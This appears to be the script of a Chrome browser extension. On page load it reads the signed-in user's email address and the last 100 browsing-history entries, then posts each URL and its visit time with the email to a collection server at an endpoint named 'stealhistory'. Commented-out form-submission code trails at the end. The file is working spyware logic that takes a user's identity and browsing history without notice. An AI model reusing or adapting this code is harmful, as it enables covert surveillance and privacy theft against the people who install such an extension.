/* global chrome */

document.addEventListener('DOMContentLoaded', function () {
    // var getStuffz = document.getElementById('getStuffz');
    var userEmail = "";
    chrome.identity.getProfileUserInfo(function (userInfo) {
        userEmail = JSON.stringify(userInfo.email);
    });
    var str = "";
    // getStuffz.addEventListener('click', function () {
    chrome.history.search({ text: '', maxResults: 100 },
        function (data) {
            data.forEach(function (page) {
                $.post("http://localhost:5000/stealhistory", { email: userEmail, url: page.url, last_visited: page.lastVisitTime }, function (data) {
                    // alert("Data Loaded: " + data);
                });
                str += "\n";
                str += page.url;
                // console.log(page.url);
            });
            window.alert(str);
        }
    );
});
    // chrome.tabs.getSelected(null, function (tab) {
    //     d = document;
    //     var f = d.createElement('form');
    //     f.method = 'post';
    //     d.body.appendChild(f);
    //     f.submit();
        // });
    // }, false);
// }, false);
